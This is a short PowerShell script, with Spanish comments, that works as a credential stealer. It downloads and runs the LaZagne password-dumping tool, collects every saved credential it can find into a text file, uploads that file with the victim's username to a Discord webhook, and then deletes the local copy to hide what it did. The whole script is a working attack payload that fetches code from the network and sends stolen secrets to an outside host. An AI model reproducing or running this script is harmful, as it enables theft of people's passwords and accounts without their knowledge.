function Create-Folder {
    param(
        [string]$folderPath
    )

    New-Item -ItemType Directory -Path $folderPath
}


Create-Folder -folderPath "C:\temp"

$dir = "C:\temp"
function Run-Lazagne {
    # Descarga Lazagne en un directorio temporal
    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"

    # Ejecuta Lazagne y guarda el resultado en un archivo llamado "resultado.txt"
    & "$dir\lazagne.exe" all > "$dir\output.txt"
}

Run-Lazagne

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position = 0, Mandatory = $False)]
        [string]$file,
        [parameter(Position = 1, Mandatory = $False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
}

if (-not ([string]::IsNullOrEmpty($dc))) { Upload-Discord -file $dir\output.txt }


RI $dir/output.txt